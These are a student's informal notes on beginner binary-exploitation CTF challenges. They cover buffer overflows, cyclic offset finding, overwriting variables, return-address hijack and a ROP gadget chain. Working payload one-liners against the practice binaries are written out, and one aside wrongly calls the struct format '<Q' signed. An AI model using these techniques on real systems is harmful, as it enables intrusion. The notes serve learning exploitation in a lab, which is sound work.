# PWN (Intro to Cyber Security)

## Your first overflow
(**EASY**)

Literally the most basic buffer overflow. Just send a message greater than the size of the buffer

## Precision

### Using PWN Tools

with ipython (interactive python): 

running gdb inside python

``` python
import pwn
r = pwn.dbg.debug("./buffer_overflow")
r # to run it
r.send(b"A"*128) # Send the buffer you want to
pwn.cyclic(128) # Creates a cyclic pattern to send a buffer 

r.send(pwn.cyclic(128))
pwn.cyclic_find("gaaa") # now we know when the overwrite takes place

r.send(b"A"*24 + b"B"*8)

pwn.p64(0x4011af) #since we found the address after the buffer we return the win address 

print(r.readall()) # this should then read the flag
```

` nm -a buffer_overflow | grep win` to get the obj dump

Creating a cyclic pattern we can use that cyclic pattern to identify the buffer size and find out how large to create our buffer overflow


Another way to find the buffer overflow size:

` dmesg | tail -n 2 `

- print 64 A's and then input that in the buffer then run the dmesg | tail -n 2 

``` python
bytes.fromhex("45454545")

payload += b"\x08\x04\x92\x96"[::-1]
```

So that is where the instruction pointer is. 
set the debug address in that payload 

then we set the 

`(python3 exploit.py; cat) | ./hacked`

# Precision (Hard)
- Stack Canary (enabled)
- NX enabled

So we got a look at it and we found that the win condition was 20 bytes after the buffer is given to us. That means that we had to write a 20 byte buffer, which we did using pwntools
and doing that got us the flag. 

![[Precision 1.png]]

As you can see here in the disassembly of challenge function, `puts` is where we write our buffer (puts is an insecure method) and 20 bytes after is the condition of challenge we overwrite that conditional or comparison and call `win` function. 
## Variable Control
In this one we have to write a buffer of 32 bytes and then input the value. We will hopefully find this value in the binary that we are going to read.

for the easy version we used this command:
` python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (1517380923).to_bytes(4,"little"))' | ./binary-exploitation-var-control-w `

## Control Hijack!
Wrote 56 bytes then the win functions address

``` python
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*56 + (0x401b19).to_bytes(8,"little"))' | ./binary-exploitation-control-hijack-w `
```

# Tricky Control Hijack
Ok so we took a look around found the win_authed address, will find the buffer length required then we also have to input the token lucky for us in the beginner one we have the token given but we won't in the hard version of the challenge and I still want to learn how to write these myself and analyze them without  AI assistance

This challenged introduced the concept of ROP Gadgets basically we had to set the token in one of the registers first so we look for where a value might be set

```
ROPgadget --binary ./binary-exploitation-control-hijack-2-w --only "pop|ret" | g
rep "pop rdi"
```

output `0x0000000000402403 : pop rdi ; ret`

then we 
``` python
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40  + struct.pack("<Q",0x402403) + struct.pack("<Q",0x1337) + struct.pack("<Q",0x401c54))' | ./binary-exploitation-control-hijack-2-w
```

use struct pack and <Q is signed int types. we write the ROP Gadget address after the buffer input, then the token then the address of auth_win

I think I will write a more indepth piece on reading binaries finding the offsets and the like later for now I have taken heavy assistance from ChatGPT to read the assembly

## PIE
So we got into a lot of headaches but I think we didn't have to write to the the ROP Gadget instead just go to a further instruction in win_authed function. 

THIS CHALLENGE HAS BEEN SO FRUSTRATING FOR ME BECAUSE I HAVE BEEN STUCK ON IT FOR TWO DAYS AND I CANT FIGURE OUT HOW TO SOLVE I THINK I GET IT BUT ITS NOT WORKING 

- 160 bytes buffer
- Input buffer begins at 0x7ffd1b860880 and is 91 bytes long
- `win_authed` stored at 0x7ffd1b860918 (120 bytes after input buffer)

-> 128 bytes buffer to be filled (91 to fill the buffer, 29 for other stuff. 8 to override return address)
